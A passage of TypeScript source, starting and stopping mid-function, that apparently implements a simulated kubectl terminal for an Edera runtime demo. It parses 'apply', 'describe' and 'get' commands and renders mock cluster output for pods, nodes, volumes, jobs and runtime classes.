        addEvent("Normal", "Deleted", "deployment/my-app", "deployment.apps/my-app deleted"); updateDashboard(); printHtml(`<span style="color:#b8ff3c;">deployment.apps/my-app deleted</span>`); return true;
      }

      if (fileName === "runtimeclass-edera.yaml") {
        // `kubectl apply` is declarative: re-applying an identical manifest
        // leaves the object untouched and reports "unchanged". The RuntimeClass
        // is cluster-scoped with no mutable fields in this demo, so an existing
        // "edera" entry always means the desired state is already met.
        if (activeRuntimeClasses.has("edera")) {
          printHtml(
            `<span style="color:#a8cfca;">runtimeclass.node.k8s.io/edera unchanged</span>`,
          );

          markDemoStepComplete("edera-runtimeclass-apply");
          return true;
        }

        activeRuntimeClasses.add("edera");

        addEvent(
          "Normal",
          "Created",
          "runtimeclass/edera",
          "runtimeclass.node.k8s.io/edera created",
        );

        printHtml(
          `<span style="color:#b8ff3c;">runtimeclass.node.k8s.io/edera created</span>`,
        );

        checkPendingPods();
        syncEderaPodsToProtectWorkloads();
        for (const deployment of deployments) {
          deployment.readyReplicas = pods.filter((pod) => pod.ownerDeployment === deployment.name && pod.status === "Running").length;
        }
        updateDashboard();

        markDemoStepComplete("edera-runtimeclass-apply");
        return true;
      }

      if (fileName === "pod-hardened-vessel.yaml") {
        const podName = "hardened-vessel";
        const manifestNamespace = requireManifestNamespace(manifestPath);
        if (!manifestNamespace) {
          return true;
        }

        const runtimeReady =
          activeRuntimeClasses.has("edera");

        const existingPod = pods.find(
          (pod) =>
            pod.name === podName &&
            pod.namespace === manifestNamespace,
        );

        if (existingPod) {
          if (existingPod.status === "Failed" && runtimeReady) {
            existingPod.status = "Pending";
            existingPod.node = "<none>";
            existingPod.ip = "<none>";
            checkPendingPods();
            syncEderaPodsToProtectWorkloads();
            updateDashboard();
            printHtml(
              `<span style="color:#b8ff3c;">pod/${podName} re-applied and recovered</span>`,
            );
          } else {
            printHtml(
              `<span style="color:#a8cfca;">pod/${podName} unchanged</span>`,
            );
          }
          return true;
        }

        pods.push({
          name: podName,
          namespace: manifestNamespace,
          status: "Pending",
          age: "1s",
          image: "denhamparry/leaky-vessel:0.1",
          ip: "<none>",
          node: "<none>",
          labels: {},
          runtimeClassName: "edera",
        });

        addEvent(
          "Normal",
          "Created",
          `pod/${podName}`,
          `pod/${podName} created from manifest`,
        );

        if (!runtimeReady) {
          addEvent(
            "Warning",
            "FailedCreatePodSandBox",
            `pod/${podName}`,
            `Failed to create pod sandbox: RuntimeClass "edera" not found`,
          );
        }

        checkPendingPods();
        updateDashboard();

        printHtml(
          `<span style="color:#b8ff3c;">pod/${podName} created</span>`,
        );

        return true;
      }

      return true;
    }
    if (tokens[1] === "describe") {
      const resource = tokens[2];
      let requestedNamespace = "default";
      let name: string | undefined;

      // Walk the args after the resource so the pod/node name and the
      // -n/--namespace flag can appear in any order, e.g. both
      // `describe pod agent -n exploitgym` and
      // `describe pod -n exploitgym agent` resolve correctly.
      for (let i = 3; i < tokens.length; i++) {
        const token = tokens[i];
        if (token === "-n" || token === "--namespace") {
          requestedNamespace = tokens[++i] || requestedNamespace;
        } else if (token.startsWith("--namespace=")) {
          requestedNamespace = token.split("=")[1] || requestedNamespace;
        } else if (token.startsWith("-")) {
          continue;
        } else if (name === undefined) {
          name = token;
        }
      }

      if (!resource || !name) {
        printHtml(
          `<span style="color:#ff7373;">Usage: kubectl describe pod|node &lt;name&gt; [-n &lt;namespace&gt;]</span>`,
        );
        return true;
      }

      if (resource === "pod" || resource === "pods") {
        const pod = pods.find(
          (item) => item.name === name && item.namespace === requestedNamespace,
        );

        if (!pod) {
          printHtml(
            `<span style="color:#ff7373;">Error from server (NotFound): pods "${escapeHtml(
              name,
            )}" not found</span>`,
          );
          return true;
        }

        const podEvents = clusterEvents.filter(
          (event) => event.object === `pod/${pod.name}`,
        );
        const workload = protectWorkloads.find(
          (item) =>
            item.sourcePodName === pod.name &&
            item.state !== "destroyed",
        );

        const ready = pod.status === "Running";
        const containerName =
          pod.image.split("/").pop()?.split(":")[0] || pod.name;

        const nodeName =
          pod.node && pod.node !== "<none>" ? pod.node : "<none>";
        const podIp =
          pod.ip && pod.ip !== "<none>" ? pod.ip : "<none>";
        const runtimeClass = effectiveRuntimeClass(pod) || "<none>";
        const workloadText = workload
          ? `${workload.name} (zone ${workload.zone})`
          : "<none>";

        const lines = [
          `Name:             ${pod.name}`,
          `Namespace:        ${pod.namespace}`,
          `Priority:         0`,
          `Service Account:  default`,
          `Node:             ${nodeName}`,
          `Start Time:       Thu, 09 Apr 2026 07:48:00 +0000`,
          `Labels:           ${formatLabels(pod.labels)}`,
          `Annotations:      <none>`,
          `Status:           ${pod.status}`,
          `IP:               ${podIp}`,
          `IPs:`,
          `  IP:  ${podIp}`,
          `Controlled By:     ${pod.ownerDeployment ? `Deployment/${pod.ownerDeployment}` : "<none>"}`,
          `RuntimeClass:     ${runtimeClass}`,
          `Edera Workload:   ${workloadText}`,
          `Containers:`,
          `  ${containerName}:`,
          `    Container ID:   containerd://webernetes-${pod.name}`,
          `    Image:          ${pod.image}`,
          `    Image ID:       ${pod.image}`,
          `    Port:           8080/TCP`,
          `    Host Port:      0/TCP`,
          `    State:          ${ready ? "Running" : pod.status}`,
          ready
            ? `      Started:      Thu, 09 Apr 2026 07:48:03 +0000`
            : `      Reason:       ${pod.status}`,
          `    Ready:          ${ready}`,
          `    Restart Count:  0`,
          `    Environment:    <none>`,
          `    Mounts:`,
          `      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access (ro)`,
          `Conditions:`,
          `  Type                        Status`,
          `  Initialized                 True`,
          `  Ready                       ${ready}`,
          `  ContainersReady             ${ready}`,
          `  PodScheduled                ${pod.status === "Pending" ? "False" : "True"}`,
          `Volumes:`,
          `  kube-api-access:`,
          `    Type:                    Projected (a volume that contains injected data from multiple sources)`,
          `    TokenExpirationSeconds:  3607`,
          `    ConfigMapName:           kube-root-ca.crt`,
          `    Optional:                false`,
          `    DownwardAPI:             true`,
          `QoS Class:                   Burstable`,
          `Node-Selectors:              <none>`,
          `Tolerations:                  node.kubernetes.io/not-ready:NoExecute op=Exists for 300s`,
          `                              node.kubernetes.io/unreachable:NoExecute op=Exists for 300s`,
          `Events:`,
          `  Type     Reason      Age   From     Message`,
          `  ----     ------      ----  ----     -------`,
          ...(podEvents.length > 0
            ? podEvents
                .slice(0, 8)
                .map(
                  (event) =>
                    `  ${event.type.padEnd(8)} ${event.reason.padEnd(12)} 1m    kubelet  ${event.message}`,
                )
            : [
                `  Normal   Scheduled   2m    kubelet  Successfully assigned ${pod.namespace}/${pod.name} to ${nodeName}`,
                `  Normal   Pulled      2m    kubelet  Container image "${pod.image}" already present`,
                `  Normal   Created     2m    kubelet  Created container ${containerName}`,
                `  Normal   Started     2m    kubelet  Started container ${containerName}`,
              ]),
        ];

        printPre(highlightDescribe(lines.join("\n")));
        return true;
      }

      if (resource === "deployment" || resource === "deployments" || resource === "deploy") {
        const deployment = deployments.find(
          (item) => item.name === name && item.namespace === requestedNamespace,
        );

        if (!deployment) {
          printHtml(
            `<span style="color:#ff7373;">Error from server (NotFound): deployments.apps "${escapeHtml(
              name,
            )}" not found</span>`,
          );
          return true;
        }

        const deploymentPods = pods.filter(
          (pod) => pod.ownerDeployment === deployment.name,
        );
        const runningPods = deploymentPods.filter(
          (pod) => pod.status === "Running",
        );
        const pendingPods = deploymentPods.filter(
          (pod) => pod.status === "Pending",
        );
        const failedPods = deploymentPods.filter(
          (pod) => pod.status === "Failed",
        );
        const deploymentEvents = clusterEvents.filter(
          (event) => event.object === `deployment/${deployment.name}`,
        );

        const nodeSelector = deployment.nodeSelector
          ? formatLabels(deployment.nodeSelector)
          : "<none>";
        const storageText = deployment.volumeClaimName
          ? `${deployment.volumeClaimName} (${deployment.volumeMode || "Filesystem"})`
          : "<none>";
        const targetPath = deployment.volumeTargetPath || "<none>";
        const runtimeClass = deployment.runtimeClassName || "<none>";

        const lines = [
          `Name:                   ${deployment.name}`,
          `Namespace:              ${deployment.namespace}`,
          `CreationTimestamp:      Thu, 06 Sep 2026 21:00:00 +0000`,
          `Labels:                 ${escapeHtml(deployment.selector)}`,
          `Annotations:            <none>`,
          `Selector:               ${escapeHtml(deployment.selector)}`,
          `Replicas:               ${deployment.replicas} desired | ${deployment.replicas} updated | ${deployment.readyReplicas} total | ${deployment.readyReplicas} available | 0 unavailable`,
          `StrategyType:           RollingUpdate`,
          `Pod Template:`,
          `  Labels:               ${escapeHtml(deployment.selector)}`,
          `  Containers:`,
          `    ${escapeHtml(deployment.image.split("/").pop()?.split(":")[0] || deployment.name)}:`,
          `      Image:            ${escapeHtml(deployment.image)}`,
          `      Port:             8080/TCP`,
          `      Host Port:        0/TCP`,
          `      Environment:      <none>`,
          `      Mounts:`,
          `        ${escapeHtml(targetPath)} from ${deployment.volumeClaimName ? escapeHtml(deployment.volumeClaimName) : "<none>"}`,
          `  Volumes:`,
          `    ${deployment.volumeClaimName ? escapeHtml(deployment.volumeClaimName) : "<none>"}:`,
          `      ClaimName:        ${deployment.volumeClaimName ? escapeHtml(deployment.volumeClaimName) : "<none>"}`,
          `      VolumeMode:       ${deployment.volumeMode || "Filesystem"}`,
          `  Node-Selectors:       ${escapeHtml(nodeSelector)}`,
          `  RuntimeClassName:     ${escapeHtml(runtimeClass)}`,
          `Conditions:`,
          `  Type           Status  Reason`,
          `  Available      ${deployment.readyReplicas >= deployment.replicas ? "True" : "False"}    ${deployment.readyReplicas >= deployment.replicas ? "MinimumReplicasAvailable" : "MinimumReplicasUnavailable"}`,
          `  Progressing    ${pendingPods.length === 0 && failedPods.length === 0 ? "True" : "False"}    ${pendingPods.length === 0 && failedPods.length === 0 ? "NewReplicaSetAvailable" : "ReplicaSetPending"}`,
          `OldReplicaSets:         <none>`,
          `NewReplicaSet:          ${deployment.name}-00001`,
          `Events:`,
          `  Type     Reason      Age   From                   Message`,
          `  ----     ------      ----  ----                   -------`,
          ...(deploymentEvents.length > 0
            ? deploymentEvents.slice(0, 8).map(
                (event) =>
                  `  ${event.type.padEnd(8)} ${event.reason.padEnd(12)} 1m    deployment-controller  ${event.message}`,
              )
            : [
                `  Normal   ScalingReplicaSet  1m    deployment-controller  Scaled up replica set ${deployment.name}-00001 to ${deployment.replicas}`,
              ]),
          `Pod Summary:             ${runningPods.length} Running, ${pendingPods.length} Pending, ${failedPods.length} Failed`,
          `Storage:                 ${escapeHtml(storageText)}`,
        ];

        printPre(highlightDescribe(lines.join("\n")));
        return true;
      }

      if (resource === "pvc" || resource === "persistentvolumeclaim" || resource === "persistentvolumeclaims") {
        const pvc = persistentVolumeClaims.find((item) => item.name === name && item.namespace === requestedNamespace);
        if (!pvc) { printHtml(`<span style="color:#ff7373;">Error from server (NotFound): persistentvolumeclaims "${escapeHtml(name)}" not found</span>`); return true; }
        const lines = [`Name:              ${pvc.name}`, `Namespace:         ${pvc.namespace}`, `Status:            ${pvc.status}`, `Volume:            ${pvc.volumeName}`, `Capacity:          ${pvc.capacity}`, `Access Modes:      ${pvc.accessModes}`, `VolumeMode:        ${pvc.volumeMode}`, `StorageClass:      ${pvc.storageClassName || "<none>"}`, `Formatted:         ${pvc.formatted}`, `Events:`, `  Normal  ${pvc.status === "Bound" ? "Bound" : "Pending"}  1m  controller  ${pvc.status === "Bound" ? `Successfully bound to ${pvc.volumeName}` : "Waiting for a matching PersistentVolume"}`];
        printPre(highlightDescribe(lines.join("\n"))); return true;
      }

      if (resource === "pv" || resource === "persistentvolume" || resource === "persistentvolumes") {
        const pv = persistentVolumes.find((item) => item.name === name);
        if (!pv) { printHtml(`<span style="color:#ff7373;">Error from server (NotFound): persistentvolumes "${escapeHtml(name)}" not found</span>`); return true; }
        const lines = [`Name:              ${pv.name}`, `Status:            ${pv.status}`, `Claim:             ${pv.claimName || "<none>"}`, `Capacity:          ${pv.capacity}`, `Access Modes:      ${pv.accessModes}`, `VolumeMode:        ${pv.volumeMode}`, `Source:             ${pv.source}${pv.devicePath ? ` (${pv.devicePath})` : ""}`, `Node Affinity:     ${pv.nodeAffinity || "<none>"}`, `Formatted:         ${pv.formatted}`];
        printPre(highlightDescribe(lines.join("\n"))); return true;
      }

      if (resource === "job" || resource === "jobs") {
        const job = jobs.find((item) => item.name === name && item.namespace === requestedNamespace);
        if (!job) { printHtml(`<span style="color:#ff7373;">Error from server (NotFound): jobs.batch "${escapeHtml(name)}" not found</span>`); return true; }
        const lines = [`Name:              ${job.name}`, `Namespace:         ${job.namespace}`, `Completions:       ${job.succeeded}/${job.completions}`, `Status:            ${job.status}`, `Image:             ${job.image}`, `RuntimeClass:      ${job.runtimeClassName || "<default>"}`, `Device:            ${job.targetDevice || "<none>"}`, `Claim:             ${job.claimName || "<none>"}`];
        printPre(highlightDescribe(lines.join("\n"))); return true;
      }

      if (resource === "node" || resource === "nodes") {
        const node = nodes.find((item) => item.name === name);

        if (!node) {
          printHtml(
            `<span style="color:#ff7373;">Error from server (NotFound): nodes "${escapeHtml(
              name,
            )}" not found</span>`,
          );
          return true;
        }

        const nodePods = pods.filter((pod) => pod.node === node.name);
        const roles = getNodeRoles(node);
        const nodeEvents = clusterEvents.filter(
          (event) => event.object === `node/${node.name}`,
        );

        const lines = [
          `Name:               ${node.name}`,
          `Roles:              ${roles}`,
          `Labels:             ${formatLabels(node.labels)}`,
          `Annotations:        <none>`,
          `CreationTimestamp:  Thu, 09 Apr 2026 07:42:00 +0000`,
          `Taints:             <none>`,
          `Unschedulable:      false`,
          `Conditions:`,
          `  Type             Status  LastHeartbeatTime`,
          `  Ready            True    Thu, 09 Apr 2026 07:53:00 +0000`,
          `Addresses:`,
          `  InternalIP:  172.31.28.${node.name.replace("node-", "2")}`,
          `Capacity:`,
          `  cpu:                2`,
          `  memory:             4Gi`,
          `  pods:               110`,
          `Allocatable:`,
          `  cpu:                2`,
          `  memory:             4Gi`,
          `  pods:               110`,
          `System Info:`,
          `  Kernel Version:             6.18.44-edera-host`,
          `  Kubelet Version:            ${node.version}`,
          `Non-terminated Pods:          (${nodePods.length} in total)`,
          ...(nodePods.length > 0
            ? nodePods.map(
                (pod) =>
                  `  Namespace  Name                 Status`,
              ).slice(0, 1)
                .concat(
                  nodePods.map(
                    (pod) =>
                      `  ${pod.namespace.padEnd(10)} ${pod.name.padEnd(20)} ${pod.status}`,
                  ),
                )
            : [`  No pods assigned.`]),
          `Events:`,
          `  Type     Reason      Age   From     Message`,
          `  ----     ------      ----  ----     -------`,
          ...(nodeEvents.length > 0
            ? nodeEvents.slice(0, 8).map(
                (event) =>
                  `  ${event.type.padEnd(8)} ${event.reason.padEnd(12)} 1m    kubelet  ${event.message}`,
              )
            : [`  Normal   Ready       5m    kubelet  Node ${node.name} is Ready`]),
        ];

        printPre(highlightDescribe(lines.join("\n")));
        return true;
      }

      printHtml(
        `<span style="color:#ff7373;">Error: describe for resource "${escapeHtml(
          resource,
        )}" is not supported.</span>`,
      );
      return true;
    }
    if (tokens[1] === "get") {
      const resource = tokens[2];

      if (
        resource === "pods" ||
        resource === "pod"
      ) {
        const allNamespaces =
          tokens.includes("-A") ||
          tokens.includes("--all-namespaces");
        const showLabels = tokens.includes("--show-labels");

        const outputFormatIndex = tokens.findIndex(
          (token) => token === "-o" || token === "--output",
        );
        const outputFormat =
          outputFormatIndex >= 0
            ? (tokens[outputFormatIndex + 1] || "")
            : "";

        const wide =
          outputFormat === "wide" ||
          tokens.includes("-o=wide") ||
          tokens.includes("--output=wide");

        let namespaceFilter = "default";

        for (let i = 0; i < tokens.length; i++) {
          if (
            tokens[i] === "-n" ||
            tokens[i] === "--namespace"
          ) {
            namespaceFilter = tokens[i + 1] || namespaceFilter;
          }

          if (tokens[i].startsWith("--namespace=")) {
            namespaceFilter =
              tokens[i].split("=")[1] || namespaceFilter;
          }
        }

        const filtered = pods.filter(
          (pod) =>
            allNamespaces ||
            pod.namespace === namespaceFilter,
        );

        const requestedPodName = tokens.find(
          (token, index) =>
            index > 2 &&
            !token.startsWith("-") &&
            !["pod", "pods"].includes(token),
        );

        // Generic `-o custom-columns=HEADER:jsonpath,...` support. Works for
        // any namespace scope (-n <ns>, -A) and honors an explicit list of pod
        // names, so these are all consistent:
        //   kubectl get pods -A -o custom-columns=...
        //   kubectl get pods -n exploitgym -o custom-columns=...
        //   kubectl get pods -n exploitgym agent -o custom-columns=...
        const customColumnsMatch = rawCmd.match(/custom-columns=(\S+)/);
        if (customColumnsMatch) {
          const columns = customColumnsMatch[1].split(",").map((part) => {
            const sep = part.indexOf(":");
            return {
              header: sep >= 0 ? part.slice(0, sep) : part,
              path: sep >= 0 ? part.slice(sep + 1) : "",
            };
          });

          // Positional pod names, skipping flags and the values consumed by
          // -n / -o / -l so the output spec itself is never read as a name.
          const requestedNames: string[] = [];
          for (let i = 3; i < tokens.length; i++) {
            const token = tokens[i];
            if (
              token === "-n" ||
              token === "--namespace" ||
              token === "-o" ||
              token === "--output" ||
              token === "-l" ||
              token === "--selector"
            ) {
              i++;
              continue;
            }
            if (token.startsWith("-")) continue;
            if (token === "pod" || token === "pods") continue;
            requestedNames.push(token);
          }

          let selected = pods.filter(
            (pod) => allNamespaces || pod.namespace === namespaceFilter,
          );

          if (requestedNames.length > 0) {
            const missing = requestedNames.find(
              (reqName) => !selected.some((pod) => pod.name === reqName),
            );
            if (missing) {
              printHtml(
                `<span style="color:#ff7373;">Error from server (NotFound): pods "${escapeHtml(
                  missing,
                )}" not found</span>`,
              );
              return true;
            }
            selected = selected.filter((pod) =>
              requestedNames.includes(pod.name),
            );
          }

          if (selected.length === 0) {
            printHtml(
              `<span style="color:#a8cfca;">No resources found.</span>`,
            );
            return true;
          }

          const resolvePath = (pod: LocalPod, path: string): string => {
            switch (path) {
              case ".metadata.name":
                return pod.name;
              case ".metadata.namespace":
                return pod.namespace;
              case ".spec.runtimeClassName":
                return effectiveRuntimeClass(pod) || "<none>";
              case ".spec.nodeName":
                return pod.node || "<none>";
              case ".status.phase":
                return pod.status;
              case ".status.podIP":
                return pod.ip || "<none>";
              default: {
                const labelMatch = path.match(/^\.metadata\.labels\.(.+)$/);
                if (labelMatch) {
                  return pod.labels[labelMatch[1]] || "<none>";
                }
                return "<none>";
              }
            }
          };

          const rows = selected.map((pod) =>
            columns.map((col) => resolvePath(pod, col.path)),
          );
          // kubectl pads each column to its widest cell plus a 3-space gutter;
          // the final column is left unpadded.
          const widths = columns.map(
            (col, idx) =>
              Math.max(
                col.header.length,
                ...rows.map((row) => row[idx].length),
              ) + 3,
          );
          const padRight = (value: string, width: number) =>
            value.length >= width
              ? `${value} `
              : value + " ".repeat(width - value.length);
          const renderRow = (cells: string[]) =>
            cells
              .map((cell, idx) =>
                idx === cells.length - 1 ? cell : padRight(cell, widths[idx]),
              )
              .join("");

          const headerLine = renderRow(columns.map((col) => col.header));
          const bodyLines = rows.map((row, rowIdx) => {
            const edera = selected[rowIdx].runtimeClassName === "edera";
            return `<span style="color:${
              edera ? "#b8ff3c" : "#dff7f0"
            };">${escapeHtml(renderRow(row))}</span>`;
          });

          printPre(
            [
              `<span style="color:#dff7f0;">${escapeHtml(headerLine)}</span>`,
              ...bodyLines,
            ].join("\n"),
          );

          // Keep the ExploitGym guide step advancing when its pods are listed.
          if (selected.some((pod) => pod.namespace === "exploitgym")) {
            markDemoStepComplete("exploitgym-pods");
          }

          return true;
        }

        if (
          outputFormat.includes("jsonpath") &&
          outputFormat.includes(".spec.runtimeClassName")
        ) {
          const pod = requestedPodName
            ? filtered.find((item) => item.name === requestedPodName)
            : filtered[0];

          if (!pod) {
            printHtml(
              `<span style="color:#ff7373;">Error from server (NotFound): pod "${escapeHtml(
                requestedPodName || "",
              )}" not found</span>`,
            );
            return true;
          }

          printPre(
            `<span style="color:#dff7f0;">${escapeHtml(
              effectiveRuntimeClass(pod) || "",
            )}</span>`,
          );

          if (
            pod.name === "edera-protect-pod" &&
            pod.runtimeClassName === "edera"
          ) {
            markDemoStepComplete("edera-pod-runtimeclass");
          }

          return true;
        }

        if (filtered.length === 0) {
          printHtml(
            `<span style="color:#a8cfca;">No resources found.</span>`,
          );
          return true;
        }

        const nameWidth = Math.max(
          21,
          ...filtered.map((pod) => pod.name.length + 2),
        );
        const namespaceWidth = Math.max(
          11,
          ...filtered.map((pod) => pod.namespace.length + 2),
        );
        const readyWidth = 8;
        const statusWidth = Math.max(11, ...filtered.map((pod) => pod.status.length + 2));
        const restartsWidth = 10;
        const ageWidth = Math.max(
          6,
          ...filtered.map((pod) => pod.age.length + 2),
        );
        const ipWidth = Math.max(
          16,
          ...filtered.map((pod) => (pod.ip || "<none>").length + 2),
        );
        const nodeWidth = Math.max(
          16,
          ...filtered.map(
            (pod) => (pod.node || "<none>").length + 2,
          ),
        );
        const nominatedNodeWidth = 17;
        const readinessGatesWidth = 17;
        const labelWidth = Math.max(
          24,
          ...filtered.map(
            (pod) => formatLabels(pod.labels).length + 2,
          ),
        );

        const headerColumns: string[] = [];

        if (allNamespaces) {
          headerColumns.push("NAMESPACE".padEnd(namespaceWidth));
        }

        headerColumns.push(
          "NAME".padEnd(nameWidth),
          "READY".padEnd(readyWidth),
          "STATUS".padEnd(statusWidth),
          "RESTARTS".padEnd(restartsWidth),
          "AGE".padEnd(ageWidth),
        );

        if (wide) {
          headerColumns.push(
            "IP".padEnd(ipWidth),
            "NODE".padEnd(nodeWidth),
            "NOMINATED NODE".padEnd(nominatedNodeWidth),
            "READINESS GATES".padEnd(readinessGatesWidth),
          );
        }

        if (showLabels) {
          headerColumns.push("LABELS".padEnd(labelWidth));
        }

        let html =
          `<span style="color:#00e5d4;font-weight:700;">` +
          headerColumns.join("") +
          `</span>\n`;

        const tableWidth =
          (allNamespaces ? namespaceWidth : 0) +
          nameWidth +
          readyWidth +
          statusWidth +
          restartsWidth +
          ageWidth +
          (wide
            ? ipWidth +
              nodeWidth +
              nominatedNodeWidth +
              readinessGatesWidth
            : 0) +
          (showLabels ? labelWidth : 0);

        html += `<span style="color:#08736d;">${"─".repeat(
          Math.max(70, tableWidth),
        )}</span>\n`;

        for (const pod of filtered) {
          const statusColor =
            pod.status === "Running"
              ? "#b8ff3c"
              : pod.status === "Failed"
                ? "#ff7373"
                : "#ffd166";

          const rowParts: string[] = [];

          if (allNamespaces) {
            rowParts.push(
              escapeHtml(
                pod.namespace.padEnd(namespaceWidth),
              ),
            );
          }

          const readyCount = pod.status === "Running" ? "1/1" : "0/1";

          rowParts.push(
            escapeHtml(pod.name.padEnd(nameWidth)),
            readyCount.padEnd(readyWidth),
            `<span style="color:${statusColor};">${escapeHtml(
              pod.status.padEnd(statusWidth),
            )}</span>`,
            "0".padEnd(restartsWidth),
            escapeHtml(pod.age.padEnd(ageWidth)),
          );

          if (wide) {
            rowParts.push(
              escapeHtml((pod.ip || "<none>").padEnd(ipWidth)),
              escapeHtml(
                (pod.node || "<none>").padEnd(nodeWidth),
              ),
              "<none>".padEnd(nominatedNodeWidth),
              "<none>".padEnd(readinessGatesWidth),
            );
          }

          if (showLabels) {
            rowParts.push(
              escapeHtml(formatLabels(pod.labels)),
            );
          }

          html += `${rowParts.join("")}\n`;
        }

        printPre(html.trimEnd());

        return true;
      }

      if (resource === "pvc" || resource === "pvcs" || resource === "persistentvolumeclaims") {
        if (persistentVolumeClaims.length === 0) { printHtml(`<span style="color:#a8cfca;">No resources found.</span>`); return true; }
        const rows = persistentVolumeClaims.map((pvc) => [
          pvc.name,
          pvc.status,
          pvc.volumeName,
          pvc.capacity,
          pvc.accessModes,
          pvc.volumeMode,
          pvc.storageClassName || "<none>",
        ]);
        printPre(
          formatTerminalTable(
            ["NAME", "STATUS", "VOLUME", "CAPACITY", "ACCESS MODES", "VOLUME MODE", "STORAGECLASS"],
            rows,
          ),
        );
        return true;
      }

      if (resource === "pv" || resource === "pvs" || resource === "persistentvolumes") {
        if (persistentVolumes.length === 0) { printHtml(`<span style="color:#a8cfca;">No resources found.</span>`); return true; }
        const rows = persistentVolumes.map((pv) => [
          pv.name,
          pv.capacity,
          pv.accessModes,
          "Delete",
          pv.status,
          pv.claimName || "<none>",
        ]);
        printPre(
          formatTerminalTable(
            ["NAME", "CAPACITY", "ACCESS MODES", "RECLAIM POLICY", "STATUS", "CLAIM"],
            rows,
          ),
        );
        return true;
      }

      if (resource === "job" || resource === "jobs") {
        if (jobs.length === 0) { printHtml(`<span style="color:#a8cfca;">No resources found.</span>`); return true; }
        const rows = jobs.map((job) => [
          job.name,
          `${job.succeeded}/${job.completions}`,
          "1s",
          "1s",
        ]);
        printPre(
          formatTerminalTable(
            ["NAME", "COMPLETIONS", "DURATION", "AGE"],
            rows,
          ),
        );
        return true;
      }

      if (resource === "runtimeclass" ||
        resource === "runtimeclasses") {
        const rows = Array.from(activeRuntimeClasses).map((runtimeClass) => [
          runtimeClass,
          runtimeClass,
          "1d",
        ]);

        printPre(
          formatTerminalTable(
            ["NAME", "HANDLER", "AGE"],
            rows,
          ),
        );

        if (activeRuntimeClasses.has("edera")) {
          markDemoStepComplete("edera-runtimeclass-list");
        }
        if (activeDemoMode === "agent-sandbox" && activeRuntimeClasses.has("edera")) {
          markDemoStepComplete("agent-sandbox-next-steps");
        }

        return true;
      }

      if (
        resource === "nodes" ||
        resource === "node"
      ) {
        const showLabels = tokens.includes("--show-labels");

        // Support Kubernetes-style label selectors such as `-l runtime=edera`
        // so `kubectl get nodes -l runtime=edera` only returns matching nodes.
        let labelSelector = "";
        for (let i = 3; i < tokens.length; i++) {
          if (tokens[i] === "-l" || tokens[i] === "--selector") {
            labelSelector = tokens[i + 1] || "";
            break;
          }
          if (tokens[i].startsWith("-l=")) {
            labelSelector = tokens[i].slice(3);
            break;
          }
          if (tokens[i].startsWith("--selector=")) {
            labelSelector = tokens[i].slice("--selector=".length);
            break;
          }
        }

        const selectedNodes = labelSelector
          ? nodes.filter((node) => {
              return labelSelector.split(",").every((selector) => {
                const expression = selector.trim();
                if (!expression) return true;

                const equalsIndex = expression.indexOf("=");
                if (equalsIndex >= 0) {
                  const key = expression.slice(0, equalsIndex).trim();
                  const value = expression.slice(equalsIndex + 1).trim();
                  return key.length > 0 && node.labels[key] === value;
                }

                return Object.prototype.hasOwnProperty.call(
                  node.labels,
                  expression,
                );
              });
            })
          : nodes;

        if (selectedNodes.length === 0) {
          printHtml(`<span style="color:#a8cfca;">No resources found.</span>`);
          return true;
        }

        const outputFormatIndex = tokens.findIndex(
          (token) => token === "-o" || token === "--output",
        );
        const outputFormat =
          outputFormatIndex >= 0
            ? (tokens[outputFormatIndex + 1] || "")
            : "";

        const wide =
          outputFormat === "wide" ||
          tokens.includes("-o=wide") ||
          tokens.includes("--output=wide");

        const nameWidth = Math.max(
          11,
          ...selectedNodes.map((node) => node.name.length + 2),
        );
        const statusWidth = Math.max(
          11,
          ...selectedNodes.map((node) => node.status.length + 2),
        );
        const rolesWidth = Math.max(
          15,
          ...selectedNodes.map((node) => getNodeRoles(node).length + 2),
        );
        const ageWidth = Math.max(
          7,
          ...selectedNodes.map((node) => node.age.length + 2),
        );
        const versionWidth = Math.max(
          20,
          ...selectedNodes.map((node) => node.version.length + 2),
        );
        const internalIpWidth = Math.max(
          16,
          ...selectedNodes.map((node) => node.internalIp.length + 2),
        );
        const externalIpWidth = Math.max(
          16,
          ...selectedNodes.map((node) => node.externalIp.length + 2),
        );
        const osImageWidth = Math.max(
          18,
          ...selectedNodes.map((node) => node.osImage.length + 2),
        );
        const kernelWidth = Math.max(
          22,
          ...selectedNodes.map((node) => node.kernelVersion.length + 2),
        );
        const runtimeWidth = Math.max(
          22,
          ...selectedNodes.map((node) => node.containerRuntime.length + 2),
        );
        const labelWidth = Math.max(
          40,
          ...selectedNodes.map(
            (node) => formatLabels(node.labels).length + 2,
          ),
        );

        const headerColumns = [
          "NAME".padEnd(nameWidth),
          "STATUS".padEnd(statusWidth),
          "ROLES".padEnd(rolesWidth),
          "AGE".padEnd(ageWidth),
          "VERSION".padEnd(versionWidth),
        ];

        if (wide) {
          headerColumns.push(
            "INTERNAL-IP".padEnd(internalIpWidth),
            "EXTERNAL-IP".padEnd(externalIpWidth),
            "OS-IMAGE".padEnd(osImageWidth),
            "KERNEL-VERSION".padEnd(kernelWidth),
            "CONTAINER-RUNTIME".padEnd(runtimeWidth),
          );
        }

        if (showLabels) {
          headerColumns.push("LABELS".padEnd(labelWidth));
        }

        let html =
          `<span style="color:#00e5d4;font-weight:700;">` +
          headerColumns.join("") +
          `</span>\n`;

        const tableWidth =
          nameWidth +
          statusWidth +
          rolesWidth +
          ageWidth +
          versionWidth +
          (wide
            ? internalIpWidth +
              externalIpWidth +
              osImageWidth +
              kernelWidth +
              runtimeWidth
            : 0) +
          (showLabels ? labelWidth : 0);

        html += `<span style="color:#08736d;">${"─".repeat(
          Math.max(70, tableWidth),
        )}</span>\n`;

        for (const node of selectedNodes) {
          const rowParts = [
            escapeHtml(node.name.padEnd(nameWidth)),
            `<span style="color:#b8ff3c;">${escapeHtml(
              node.status.padEnd(statusWidth),
            )}</span>`,
            escapeHtml(getNodeRoles(node).padEnd(rolesWidth)),
            escapeHtml(node.age.padEnd(ageWidth)),
            escapeHtml(node.version.padEnd(versionWidth)),
          ];

          if (wide) {
            rowParts.push(
              escapeHtml(node.internalIp.padEnd(internalIpWidth)),
              escapeHtml(node.externalIp.padEnd(externalIpWidth)),
              escapeHtml(node.osImage.padEnd(osImageWidth)),
              escapeHtml(node.kernelVersion.padEnd(kernelWidth)),
              escapeHtml(node.containerRuntime.padEnd(runtimeWidth)),
            );
          }

          if (showLabels) {
            rowParts.push(
              escapeHtml(formatLabels(node.labels)),
            );
          }

          html += `${rowParts.join("")}\n`;
        }

        printPre(html.trimEnd());

        return true;
      }

      if (
        resource === "deployments" ||
        resource === "deployment" ||
